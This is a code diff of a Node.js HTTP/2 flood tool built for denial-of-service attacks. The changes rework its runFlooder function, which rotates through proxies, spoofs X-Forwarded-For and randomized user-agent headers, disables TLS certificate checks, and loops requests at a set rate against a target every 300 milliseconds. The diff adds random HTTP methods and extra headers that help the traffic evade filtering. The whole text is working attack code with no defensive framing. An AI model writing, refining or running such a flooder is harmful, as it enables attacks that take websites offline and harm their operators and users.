@@ -341,298 +341,308 @@ return result;
 const randstrsValue = randstrs(10);
 
 function runFlooder() {
-    const proxyCount = Math.floor(args.Rate / 10) || 1; // Use 1 proxy per 10 requests, minimum 1
+    // Select a new random proxy for each connection attempt
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
+    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
 
-    for (let p = 0; p < proxyCount; p++) {
-        const proxyAddr = randomElement(proxies); // Randomly pick a proxy without storing
-        const parsedProxy = proxyAddr.split(":");
-        const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
-        const nm = [
-            "110.0.0.0",
-            "111.0.0.0",
-            "112.0.0.0",
-            "113.0.0.0",
-            "114.0.0.0",
-            "115.0.0.0",
-            "116.0.0.0",
-            "117.0.0.0",
-            "118.0.0.0",
-            "119.0.0.0",
-        ];
-        const nmx = [
-            "120.0",
-            "119.0",
-            "118.0",
-            "117.0",
-            "116.0",
-            "115.0",
-            "114.0",
-            "113.0",
-            "112.0",
-            "111.0",
-        ];
-        const nmx1 = [
-            "105.0.0.0",
-            "104.0.0.0",
-            "103.0.0.0",
-            "102.0.0.0",
-            "101.0.0.0",
-            "100.0.0.0",
-            "99.0.0.0",
-            "98.0.0.0",
-            "97.0.0.0",
-        ];
-        const sysos = [
-            "Windows 1.01",
-            "Windows 1.02",
-            "Windows 1.03",
-            "Windows 1.04",
-            "Windows 2.01",
-            "Windows 3.0",
-            "Windows NT 3.1",
-            "Windows NT 3.5",
-            "Windows 95",
-            "Windows 98",
-            "Windows 2006",
-            "Windows NT 4.0",
-            "Windows 95 Edition",
-            "Windows 98 Edition",
-            "Windows Me",
-            "Windows Business",
-            "Windows XP",
-            "Windows 7",
-            "Windows 8",
-            "Windows 10 version 1507",
-            "Windows 10 version 1511",
-            "Windows 10 version 1607",
-            "Windows 10 version 1703",
-        ];
-        const winarch = [
-            "x86-16",
-            "x86-16, IA32",
-            "IA-32",
-            "IA-32, Alpha, MIPS",
-            "IA-32, Alpha, MIPS, PowerPC",
-            "Itanium",
-            "x86_64",
-            "IA-32, x86-64",
-            "IA-32, x86-64, ARM64",
-            "x86-64, ARM64",
-            "ARMv4, MIPS, SH-3",
-            "ARMv4",
-            "ARMv5",
-            "ARMv7",
-            "IA-32, x86-64, Itanium",
-            "IA-32, x86-64, Itanium",
-            "x86-64, Itanium",
-        ];
-        const winch = [
-            "2012 R2",
-            "2019 R2",
-            "2012 R2 Datacenter",
-            "Server Blue",
-            "Longhorn Server",
-            "Whistler Server",
-            "Shell Release",
-            "Daytona",
-            "Razzle",
-            "HPC 2008",
-        ];
-        const rd = [
-            "221988",
-            "1287172",
-            "87238723",
-            "8737283",
-            "8238232",
-            "63535464",
-            "121212",
-        ];
-        var nm1 = nm[Math.floor(Math.random() * nm.length)];
-        var nm2 = sysos[Math.floor(Math.random() * sysos.length)];
-        var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
-        var nm4 = nmx[Math.floor(Math.random() * nmx.length)];
-        var nm5 = winch[Math.floor(Math.random() * winch.length)];
-        var nm6 = nmx1[Math.floor(Math.random() * nmx1.length)];
-        var kha = rd[Math.floor(Math.random() * rd.length)];
+    const nm = [
+        "110.0.0.0",
+        "111.0.0.0",
+        "112.0.0.0",
+        "113.0.0.0",
+        "114.0.0.0",
+        "115.0.0.0",
+        "116.0.0.0",
+        "117.0.0.0",
+        "118.0.0.0",
+        "119.0.0.0",
+    ];
+    const nmx = [
+        "120.0",
+        "119.0",
+        "118.0",
+        "117.0",
+        "116.0",
+        "115.0",
+        "114.0",
+        "113.0",
+        "112.0",
+        "111.0",
+    ];
+    const nmx1 = [
+        "105.0.0.0",
+        "104.0.0.0",
+        "103.0.0.0",
+        "102.0.0.0",
+        "101.0.0.0",
+        "100.0.0.0",
+        "99.0.0.0",
+        "98.0.0.0",
+        "97.0.0.0",
+    ];
+    const sysos = [
+        "Windows 1.01",
+        "Windows 1.02",
+        "Windows 1.03",
+        "Windows 1.04",
+        "Windows 2.01",
+        "Windows 3.0",
+        "Windows NT 3.1",
+        "Windows NT 3.5",
+        "Windows 95",
+        "Windows 98",
+        "Windows 2006",
+        "Windows NT 4.0",
+        "Windows 95 Edition",
+        "Windows 98 Edition",
+        "Windows Me",
+        "Windows Business",
+        "Windows XP",
+        "Windows 7",
+        "Windows 8",
+        "Windows 10 version 1507",
+        "Windows 10 version 1511",
+        "Windows 10 version 1607",
+        "Windows 10 version 1703",
+    ];
+    const winarch = [
+        "x86-16",
+        "x86-16, IA32",
+        "IA-32",
+        "IA-32, Alpha, MIPS",
+        "IA-32, Alpha, MIPS, PowerPC",
+        "Itanium",
+        "x86_64",
+        "IA-32, x86-64",
+        "IA-32, x86-64, ARM64",
+        "x86-64, ARM64",
+        "ARMv4, MIPS, SH-3",
+        "ARMv4",
+        "ARMv5",
+        "ARMv7",
+        "IA-32, x86-64, Itanium",
+        "IA-32, x86-64, Itanium",
+        "x86-64, Itanium",
+    ];
+    const winch = [
+        "2012 R2",
+        "2019 R2",
+        "2012 R2 Datacenter",
+        "Server Blue",
+        "Longhorn Server",
+        "Whistler Server",
+        "Shell Release",
+        "Daytona",
+        "Razzle",
+        "HPC 2008",
+    ];
 
-        encoding_header = [
-            'gzip, deflate, br',
-            'compress, gzip',
-            'deflate, gzip',
-            'gzip, identity'
-        ];
+    var nm1 = nm[Math.floor(Math.random() * nm.length)];
+    var nm2 = sysos[Math.floor(Math.random() * sysos.length)];
+    var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
+    var nm4 = nmx[Math.floor(Math.random() * nmx.length)];
+    var nm5 = winch[Math.floor(Math.random() * winch.length)];
+    var nm6 = nmx1[Math.floor(Math.random() * nmx1.length)];
+    const rd = [
+        "221988",
+        "1287172",
+        "87238723",
+        "8737283",
+        "8238232",
+        "63535464",
+        "121212",
+    ];
+    var kha = rd[Math.floor(Math.random() * rd.length)];
 
-        function randstrr(length) {
-            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
-            let result = "";
-            const charactersLength = characters.length;
-            for (let i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * charactersLength));
-            }
-            return result;
+    const encoding_header = [
+        'gzip, deflate, br',
+        'compress, gzip',
+        'deflate, gzip',
+        'gzip, identity',
+    ];
+
+    function randstrr(length) {
+        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
+        let result = "";
+        const charactersLength = characters.length;
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
         }
-
-        function randstr(length) {
-            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            let result = "";
-            const charactersLength = characters.length;
-            for (let i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * charactersLength));
-            }
-            return result;
-        }
-
-        function generateRandomString(minLength, maxLength) {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-            const randomStringArray = Array.from({ length }, () => {
-                const randomIndex = Math.floor(Math.random() * characters.length);
-                return characters[randomIndex];
-            });
-            return randomStringArray.join('');
-        }
-
-        const val = {
-            'NEl': JSON.stringify({
-                "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
-                "max-age": Math.random() < 0.5 ? 604800 : 2561000,
-                "include_subdomains": Math.random() < 0.5
-            })
-        };
-
-        const rateHeaders = [
-            { "accept": accept_header[Math.floor(Math.random() * accept_header.length)] },
-            { "Access-Control-Request-Method": "GET" },
-            { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
-            { "origin": "https://" + parsedTarget.host },
-            { "source-ip": randstr(5) },
-            { "data-return": "false" },
-            { "X-Forwarded-For": parsedProxy[0] },
-            { "NEL": val },
-            { "dnt": "1" },
-            { "A-IM": "Feed" },
-            { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
-            { 'Delta-Base': '12340001' },
-            { "te": "trailers" },
-            { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
-        ];
-
-        let headers = {
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-            ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
-            ":method": "GET",
-            "pragma": "no-cache",
-            "upgrade-insecure-requests": "1",
-            "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
-            "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
-            "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
-            "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
-            "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
-            "user-agent": "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha + " " + nm4 + ") /Gecko/20100101 Edg/91.0.864.104 " + nm4,
-        };
-
-        const proxyOptions = {
-            host: parsedProxy[0],
-            port: ~~parsedProxy[1],
-            address: parsedTarget.host + ":443",
-            timeout: 10
-        };
-
-        Socker.HTTP(proxyOptions, (connection, error) => {
-            if (error) return;
-
-            connection.setKeepAlive(true, 600000);
-            connection.setNoDelay(true);
-
-            const settings = {
-                enablePush: false,
-                initialWindowSize: 15564991,
-            };
-
-            const tlsOptions = {
-                port: parsedPort,
-                secure: true,
-                ALPNProtocols: ["h2"],
-                ciphers: cipper,
-                sigalgs: sigalgs,
-                requestCert: true,
-                socket: connection,
-                ecdhCurve: ecdhCurve,
-                honorCipherOrder: false,
-                rejectUnauthorized: false,
-                secureOptions: secureOptions,
-                secureContext: secureContext,
-                host: parsedTarget.host,
-                servername: parsedTarget.host,
-                secureProtocol: secureProtocol
-            };
-
-            const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
-
-            tlsConn.allowHalfOpen = true;
-            tlsConn.setNoDelay(true);
-            tlsConn.setKeepAlive(true, 600000);
-            tlsConn.setMaxListeners(0);
-
-            const client = http2.connect(parsedTarget.href, {
-                settings: {
-                    headerTableSize: 65536,
-                    maxHeaderListSize: 32768,
-                    initialWindowSize: 15564991,
-                    maxFrameSize: 16384,
-                },
-                createConnection: () => tlsConn
-            });
-
-            client.setMaxListeners(0);
-            client.settings(settings);
-
-            client.on("connect", () => {
-                const IntervalAttack = setInterval(() => {
-                    for (let i = 0; i < Math.ceil(args.Rate / proxyCount); i++) { // Distribute requests
-                        const dynHeaders = {
-                            ...headers,
-                            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
-                        };
-
-                        const request = client.request({
-                            ...dynHeaders,
-                        }, {
-                            parent: 0,
-                            exclusive: true,
-                            weight: 220,
-                        })
-                            .on('response', response => {
-                                request.close();
-                                request.destroy();
-                                return;
-                            });
-                        request.end();
-                    }
-                }, 300);
-            });
-
-            client.on("close", () => {
-                client.destroy();
-                tlsConn.destroy();
-                connection.destroy();
-                return;
-            });
-
-            client.on("timeout", () => {
-                client.destroy();
-                connection.destroy();
-                return;
-            });
-
-            client.on("error", error => {
-                client.destroy();
-                connection.destroy();
-                return;
-            });
-        });
+        return result;
     }
+
+    function randstr(length) {
+        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        let result = "";
+        const charactersLength = characters.length;
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+    }
+
+    function generateRandomString(minLength, maxLength) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+        const randomStringArray = Array.from({ length }, () => {
+            const randomIndex = Math.floor(Math.random() * characters.length);
+            return characters[randomIndex];
+        });
+        return randomStringArray.join('');
+    }
+
+    const val = {
+        'NEl': JSON.stringify({
+            "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
+            "max-age": Math.random() < 0.5 ? 604800 : 2561000,
+            "include_subdomains": Math.random() < 0.5 ? true : false
+        }),
+    };
+
+    // Expanded rateHeaders with various HTTP methods
+    const httpMethods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"];
+    const rateHeaders = [
+        { "accept": accept_header[Math.floor(Math.random() * accept_header.length)] },
+        { "Access-Control-Request-Method": httpMethods[Math.floor(Math.random() * httpMethods.length)] },
+        { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
+        { "origin": "https://" + parsedTarget.host },
+        { "source-ip": randstr(5) },
+        { "data-return": "false" },
+        { "X-Forwarded-For": parsedProxy[0] },
+        { "NEL": val },
+        { "dnt": "1" },
+        { "A-IM": "Feed" },
+        { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
+        { 'Delta-Base': '12340001' },
+        { "te": "trailers" },
+        { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
+        { "content-type": Math.random() < 0.5 ? "application/json" : "application/x-www-form-urlencoded" }, // For POST/PUT
+        { "content-length": Math.random() < 0.5 ? "0" : String(Math.floor(Math.random() * 1000)) }, // Dynamic content length
+    ];
+
+    let headers = {
+        ":authority": parsedTarget.host,
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
+        ":method": httpMethods[Math.floor(Math.random() * httpMethods.length)], // Randomly select HTTP method
+        "pragma": "no-cache",
+        "upgrade-insecure-requests": "1",
+        "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
+        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
+        "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
+        "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
+        "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
+        "user-agent": "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha + " " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
+    };
+
+    const proxyOptions = {
+        host: parsedProxy[0],
+        port: ~~parsedProxy[1],
+        address: parsedTarget.host + ":443",
+        timeout: 10
+    };
+
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) return;
+
+        connection.setKeepAlive(true, 600000);
+        connection.setNoDelay(true);
+
+        const settings = {
+            enablePush: false,
+            initialWindowSize: 15564991,
+        };
+
+        const tlsOptions = {
+            port: parsedPort,
+            secure: true,
+            ALPNProtocols: ["h2"],
+            ciphers: cipper,
+            sigalgs: sigalgs,
+            requestCert: true,
+            socket: connection,
+            ecdhCurve: ecdhCurve,
+            honorCipherOrder: false,
+            rejectUnauthorized: false,
+            secureOptions: secureOptions,
+            secureContext: secureContext,
+            host: parsedTarget.host,
+            servername: parsedTarget.host,
+            secureProtocol: secureProtocol
+        };
+
+        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
+
+        tlsConn.allowHalfOpen = true;
+        tlsConn.setNoDelay(true);
+        tlsConn.setKeepAlive(true, 600000);
+        tlsConn.setMaxListeners(0);
+
+        const client = http2.connect(parsedTarget.href, {
+            settings: {
+                headerTableSize: 65536,
+                maxHeaderListSize: 32768,
+                initialWindowSize: 15564991,
+                maxFrameSize: 16384,
+            },
+            createConnection: () => tlsConn,
+        });
+
+        client.settings({
+            headerTableSize: 65536,
+            maxHeaderListSize: 32768,
+            initialWindowSize: 15564991,
+            maxFrameSize: 16384,
+        });
+
+        client.setMaxListeners(0);
+        client.settings(settings);
+
+        client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const dynHeaders = {
+                        ...headers,
+                        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+                    };
+
+                    const request = client.request({
+                        ...dynHeaders,
+                    }, {
+                        parent: 0,
+                        exclusive: true,
+                        weight: 220,
+                    })
+                        .on('response', response => {
+                            request.close();
+                            request.destroy();
+                            return;
+                        });
+                    request.end();
+                }
+            }, 300);
+        });
+
+        client.on("close", () => {
+            client.destroy();
+            tlsConn.destroy();
+            connection.destroy();
+            return;
+        });
+
+        client.on("timeout", () => {
+            client.destroy();
+            connection.destroy();
+            return;
+        });
+
+        client.on("error", error => {
+            client.destroy();
+            connection.destroy();
+            return;
+        });
+    });
 }
 
 const StopScript = () => process.exit(1);
